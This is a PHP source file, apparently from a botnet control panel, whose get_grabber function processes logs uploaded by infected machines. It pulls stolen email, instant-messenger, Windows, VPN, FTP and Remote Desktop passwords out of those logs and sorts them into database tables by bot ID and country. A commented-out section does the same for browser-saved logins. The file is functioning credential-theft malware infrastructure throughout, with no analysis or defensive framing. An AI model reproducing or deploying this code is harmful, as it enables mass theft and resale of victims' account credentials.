<?php

if(!function_exists('get_grabber')){	function get_grabber($log){		global $dir, $geoip_ex, $mysqli, $gi, $filters, $task, $fs, $cb;

        preg_match_all('~#BOTSTART#(.*):(.*)#BOTNIP#(.*?)#BOTEND#~isU', $log, $match, PREG_SET_ORDER);
        $log = '';
        $unnecessary_uniq = array();
        $cbp = 0;
        $abp = count($match);

        if($abp > 0){        	foreach($match as $item){
	        	preg_match_all('~#START#(.*)#NAME#(.*)#END#~isU', $item[3], $mitem, PREG_SET_ORDER);

				if(!empty($item[1])){
	            	$matches = explode('0', $item[1], 2);
					if(!empty($matches[0]) && !empty($matches[1])){
						$prefix = strtoupper($matches[0]);
						$uid = strtoupper($matches[1]);
					}else{
						$prefix = 'UNKNOWN';
						$uid = 'UNKNOWN';
					}
				}else{
					$prefix = 'UNKNOWN';
					$uid = 'UNKNOWN';
				}

				if($geoip_ex != true){
					$country = geoip_country_code_by_name($item[2]);
				}else{
					if(file_exists($dir['site'] . '/cache/geoip/')) $country = geoip_country_code_by_addr($gi, $item[2]);
				}
				if(empty($country)) $country = 'UNK';

				foreach($mitem as $sitem){
					switch($sitem[1]){
						//Браузеры
						/*
						case 'Internet Explorer':
						case 'Opera':
						case 'Mozilla Firefox':
						case 'Google Chrome':
						case 'Apple Safari':
						case 'AppleSafari':
						case 'InternetExplorer':
						case 'MozillaFirefox':
						case 'GoogleChrome':
	                    	$data = explode("\r\n", $sitem[2]);

	                    	if(count($data) > 0){	                    		foreach($data as $line){	                    			if(!empty($line)){	                    				$ld = explode("@@@", $line);

	                    				if(count($ld) > 1){	                    					$ld[0] = preg_replace('~ \((.*)\)~', '', $ld[0]);
			                				if(stripos($ld[0], 'http://') !== false){
			                					$port = @parse_url($ld[0], PHP_URL_PORT);
			                					$host = get_host($ld[0]);
			                				}elseif(stripos($ld[0], 'https://') !== false){
			                					$port = @parse_url($ld[0], PHP_URL_PORT);
			                					$host = get_host($ld[0]);
			                				}elseif(stripos($ld[0], 'site://') !== false){
			                					$ld[0] = str_replace('site://', 'http://', $ld[0]);
			                					$port = @parse_url($ld[0], PHP_URL_PORT);
			                					$host = get_host($ld[0]);
			                				}else{
			                					$port = @parse_url($ld[0], PHP_URL_PORT);
			                					$host = get_host('http://' . $ld[0]);
			                				}

			                				$import = true;

			                				if($import === true){			                					if(isset($filters[$host])){			                						$count = count($ld);
			                						if($count == 2){			                							$set_data = explode(':', $ld[1]);
			                						}elseif($count > 2){			                							$set_data = array();
			                							for($i = 1; $i < count($ld); $i++){			                								$s_data = explode(':', $ld[$i]);
			                								$set_data[$i-1] = $s_data[1];
			                							}
			                						}

			                						if(count($set_data) > 0){			                							$c_data = count($set_data);
			                							$set_data = implode(':', $set_data);
			                							$mysqli->query("INSERT DELAYED INTO bf_filter_".$filters[$host]['id']." (prefix, uid, country, md5_hash, program, type, post_date, url, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($set_data . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '".urlencode($ld[0])."', '".$c_data."', '".urlencode($set_data)."', '".strlen($set_data)."')");

			                						    //if($filters[$host]['save_log'] == '1'){
				                					    //	$mysqli->query('INSERT DELAYED INTO bf_filters_save (host, file, type) VALUES (\''.$host.'\', \''.md5($host).'\', \''.$task->type.'\')');
				                					    //	file_put_contents($dir['s'][$task->type] . '/' . md5($host), '#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n", FILE_APPEND);
				                					    //}

			                						}


			                					}else{			                						if($task->unnecessary != true){			                							if(empty($unnecessary_uniq[$host])){			                								$unnecessary_uniq[$host] = md5($host);
			                								$mysqli->query('INSERT DELAYED INTO bf_filters_unnecessary (host, file, type) VALUES (\''.$host.'\', \''.$unnecessary_uniq[$host].'\', \''.$task->type.'\')');
			                							}
			                							file_put_contents($dir['u'][$task->type] . '/' . $unnecessary_uniq[$host], '#BOTSTART#'.$item[1].':'.$item[2].'#BOTNIP#'."\r\n".'#START#'.$sitem[1].'#NAME#'."\r\n".$line."\r\n".'#END#'."\r\n".'#BOTEND#' . "\r\n", FILE_APPEND);
			                						}
			                					}
			                				}
	                    				}
	                    			}
	                    		}
	                    	}
						break;
						*/

						// Почтовые клиенты
						case 'Outlook':
						case 'IncrediMail':
						case 'TheBat!':
						case 'WindowsLiveMail':
						case 'Eudora':
						case 'ForteAgent':
						case 'POPPeeper':
						case 'Becky':
	                    	$data = explode("...\r\n", $sitem[2]);
	                    	if(count($data) > 0){	                    		foreach($data as $line){	                    			preg_match_all('~Email: (.*)'."\r\n".'~', $line, $email, PREG_SET_ORDER);
	                    			preg_match_all('~Password \(POP3\): (.*)'."\r\n".'~', $line, $pass, PREG_SET_ORDER);
	                    			if(!empty($email[0][1]) && !empty($pass[0][1])){	                    				$mysqli->query("INSERT DELAYED INTO bf_filter_ep (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($email[0][1] . $pass[0][1] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '2', '".urlencode($email[0][1] . ':' . $pass[0][1])."', '".strlen($email[0][1] . ':' . $pass[0][1])."')");
	                    			}
	                    		}
	                    	}
						break;

						// Программы общения
						case 'Pidgin':
						case 'AIM':
						case 'Trillian':
						case 'MySpaceIM':
						case 'QIP':
						case 'CamFrog':
						case 'Paltalk':
						case 'ICQ2003/Lite':
						case 'MSNMessenger':
						case 'TrillianAstra':
						case 'Trillian Astra':
						case 'WindowsLiveMessenger':
						case 'WindowsCredentials':
						case 'ASP.NETAccount':
						case 'GoogleTalk':
						case 'CiscoVPNClient':
	                	case 'Mail.RuAgent':
						case 'Yahoo!Messenger':
						case 'QIP.Online':
						case 'FreeCall':
						case 'Miranda':
						case 'ICQ99b-2002':
						case 'PSI':
						case 'SIM':
						case 'Pandion':
						case 'JAJC':
						case 'Digsby':
						case 'AIMPro':
	                    	$data = explode("...\r\n", $sitem[2]);
	                		if(count($data) > 0){
	                			foreach($data as $line){
	                				preg_match_all('~UIN/Name: (.*)'."\r\n".'~', $line, $uin, PREG_SET_ORDER);
	                				preg_match_all('~Pass: (.*) \(hex: (.*)\)'."\r\n".'~', $line, $pass, PREG_SET_ORDER);
	                				if(!empty($uin[0][1]) && !empty($pass[0][1]) && !empty($pass[0][2])){
	                					$mysqli->query("INSERT DELAYED INTO bf_filter_me (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($uin[0][1] . $pass[0][1] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($uin[0][1] . ':' . $pass[0][1])."', '".strlen($uin[0][1] . ':' . $pass[0][1])."')");
	                    			}
	                			}
	                		}
						break;

	                	// ФТП
	                	case 'FlashFXP':
	                	case 'Windows/TotalCommander':
	                	case 'FileZilla':
	                	case 'FFFTP':
	                	case 'CuteFTP':
	                	case 'SmartFTP':
	                	case 'CoreFTP':
	                	case 'WinSCP':
	                	case 'FTPCommander':
	                	case 'WS_FTP':
	                	case 'FARManagerFTP':
	                	case 'BulletProofFTPClient':
						case 'FreeFTP/DirectFTP':
						case 'FTPRush':
						case 'BitKinex':
						case 'LeapFTP':
						case 'FTPExplorer':
						case 'Fling':
						case 'SoftXFTPClient':
						case 'CoffeeCupFTP':
						case 'ClassicFTP':
	                    	$data = explode("\r\n", $sitem[2]);
	                		if(count($data) > 0){
	                			foreach($data as $line){
	                				$ld = parse_url($line);
	                				//error_log(print_r($ld, true));
	                				if(count($ld) > 3){	                					if($ld['scheme'] == 'ftp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){	                						$mysqli->query("INSERT DELAYED INTO bf_filter_ft (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."', '".strlen($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."')");
	                					}
	                    			}
	                			}
	                		}
						break;

	                	case 'WinVNC':
	                		//
	                	break;

	                	case 'RemoteDesktopConnection':
	                    	$data = explode("\r\n", $sitem[2]);
	                		if(count($data) > 0){
	                			foreach($data as $line){
	                				$ld = parse_url($line);
	                				$ld['user'] = str_replace('\\', '/', $ld['user']);
	                				if(count($ld) > 3){	                					if($ld['scheme'] == 'rdp' && !empty($ld['host']) && !empty($ld['user']) && !empty($ld['pass'])){	                						$mysqli->query("INSERT DELAYED INTO bf_filter_rd (prefix, uid, country, md5_hash, program, type, post_date, fields, data, size) VALUES ('".$prefix."', '".$uid."', '".$country."', '".md5($ld['host'] . $ld['user'] . $ld['pass'] . $task->type)."', '".$sitem[1]."', '".$task->type."', NOW(), '3', '".urlencode($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."', '".strlen($ld['host'] . ':' . $ld['user'] . ':' . $ld['pass'])."')");
	                					}
	                    			}
	                			}
	                		}
	                	break;

	                	default:
	                		//file_put_contents($dir['site'] . 'cache/imports/unknow_grabber_type.txt', $sitem[1] . "\r\n", FILE_APPEND);
	                	break;
					}
				}
				unset($unnecessary_uniq);
        	}
        	$cbp++;
        	file_put_contents($dir['site'] . 'cache/proc/' . $task->id, $fs . '|' . $cb . '|' . $abp . '|' . $cbp);
        }
	}
}

?>